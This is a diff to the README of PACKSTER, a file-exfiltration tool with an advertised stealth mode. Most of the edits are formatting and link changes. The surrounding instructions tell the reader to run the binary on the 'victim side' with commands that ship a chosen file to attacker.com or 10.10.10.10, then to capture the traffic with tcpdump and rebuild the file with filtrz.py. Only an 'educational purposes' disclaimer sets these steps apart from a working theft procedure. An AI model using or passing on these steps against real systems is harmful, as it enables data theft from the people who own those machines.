@@ -10,31 +10,35 @@ PACKSTER is a powerful exfiltration tool designed for demonstrating efficient da
 - Stealth mode for evasion techniques
 - Logging and error handling for debugging
 
+## Watch The Demo
+
 [![Packster Demo](https://img.youtube.com/vi/r4g577TrCSw/maxresdefault.jpg)](https://www.youtube.com/watch?v=r4g577TrCSw)
 
 ## Installation
 ### Prerequisites
 Ensure you have Python installed on your system. PACKSTER requires Python 3.x.
 
-### Clone the Repository
+### Clone The Repository
 ```bash
-git clone https://github.com/yourusername/packster.git
+git clone https://github.com/Sayan690/packster.git
 cd packster
 ```
 
-### Get the [release binaries](https://github.com/Sayan690/Packster/releases/)
+### Get The [Release Binaries](https://github.com/Sayan690/Packster/releases/)
 
 OR
 
-### Compile it locally
+### Compile It Locally
 
 Requirements - pyinstaller
 
-#### Clone the repository
+#### Clone The Repository
 ```bash
-git clone https://github.com/yourusername/packster.git
+git clone https://github.com/Sayan690/packster.git
 cd packster
 ```
+
+#### Compile Using Pyinstaller
 
 ```bash
 pyinstaller -F packety.py --icon=resources/packster.ico
@@ -57,7 +61,7 @@ tcpdump -i any -w capture.pcap
 - Transfer the [packster binary](https://github.com/Sayan690/Packster/releases/) to the victim side and execute
 
 ```bash
-.\\packster.exe -f C:\\Path\\To\\File -a attacker.com
+.\packster.exe -f C:\Path\To\File -a attacker.com
 
 ./packster.exe -f /Path/To/File -a 10.10.10.10
 ```
@@ -72,7 +76,7 @@ python3 filtrz.py -a attacker.com -c capture.pcap -o output_file_name.txt
 PACKSTER is intended for educational and security testing purposes only. The author is not responsible for any misuse of this tool.
 
 ## Author
-Developed by **Sayan Ray** [@BareBones90]
+Developed by **Sayan Ray** [@BareBones90](https://x.com/BareBones90)
 
 ## License
 This project is licensed under the MIT License - see the LICENSE file for details.
